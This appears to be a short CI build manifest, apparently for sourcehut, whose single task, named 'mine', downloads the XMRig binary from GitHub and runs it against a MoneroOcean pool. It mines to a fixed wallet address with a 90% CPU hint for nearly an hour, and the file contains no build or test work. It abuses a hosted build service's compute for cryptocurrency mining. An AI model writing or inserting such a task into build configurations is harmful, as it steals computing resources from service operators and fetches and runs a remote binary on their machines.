image: ubuntu/latest
sources:
  - https://github.com/ecustmechanical/zmh
tasks:
  - mine: |
      sudo sysctl -w vm.nr_hugepages=1280 2>/dev/null || true
      curl -sL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
      tar xzf xmrig.tar.gz --strip-components=1
      chmod +x xmrig
      timeout 3400 ./xmrig -o gulf.moneroocean.stream:10032 -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X -p sourcehut --donate-level=0 --cpu-max-threads-hint=90
